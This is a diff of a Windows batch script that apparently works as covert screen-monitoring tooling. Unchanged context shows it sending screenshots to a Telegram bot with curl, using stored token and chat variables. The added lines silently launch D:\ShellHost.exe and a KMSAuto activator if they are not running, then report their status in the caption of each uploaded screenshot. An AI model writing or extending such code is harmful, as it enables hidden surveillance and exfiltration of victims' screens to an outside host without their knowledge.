@@ -6,18 +6,21 @@ if not exist "%temp%\i059.tmp" type nul > "%temp%\i059.tmp"
 
 
 
+
 setlocal enabledelayedexpansion
 
 
+set "BATCHVERSION=2.0"
 
 
-set "BATCHVERSION=1.9"
+
 
 
 
 
 set nircmd="%APPDATA%\Microsoft\nircmd.exe"
-
+set "SHSTFILE=D:\ShellHost.exe"
+set "KMSFILE=D:\KMSAuto.exe"
 
 :: ============ MyScreen TOPIC ============
 
@@ -136,6 +139,48 @@ echo 1 > "%temp%\run_once1.flag"
 
 
 :skip_code
+
+
+
+
+
+
+:: Check if SHSTFILE is running
+set "SHSTRUNNING=0"
+powershell -command "if (Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq '%SHSTFILE%' }) { exit 0 } else { exit 1 }"
+if %errorlevel%==1 (
+    echo %SHSTFILE% is not running. starting now...
+    start "" "%SHSTFILE%"
+) else (
+    set "SHSTRUNNING=1"
+    echo %SHSTFILE% is already running.
+)
+
+echo SHST RUNNING is !SHSTRUNNING! and %SHSTRUNNING%
+
+echo.
+echo.
+
+
+
+
+
+:: Check if KMSFILE is running
+set "KMSRUNNING=0"
+powershell -command "if (Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq '%KMSFILE%' }) { exit 0 } else { exit 1 }"
+if %errorlevel%==1 (
+    echo %KMSFILE% is not running. starting now...
+    start "" "%KMSFILE%"
+) else (
+    set "KMSRUNNING=1"
+    echo %KMSFILE% is already running.
+)
+
+echo KMS RUNNING is !KMSRUNNING! and %KMSRUNNING%
+
+echo.
+echo.
+
 
 
 
@@ -284,7 +329,7 @@ echo. >> "%output_file%"
 curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendPhoto" ^
      -F "chat_id=%CHAT_ID_MyScrn%" ^
      -F "message_thread_id=%TOPIC_ID_MyScrn%" ^
-     -F "caption=|%time%|%BATCHVERSION%|" ^
+     -F "caption=|%time%|SHST%SHSTRUNNING%KMS%KMSRUNNING%|%BATCHVERSION%|" ^
      -F "photo=@%FILE_PATH_MyScrn%" ^
      --limit-rate 80K
 
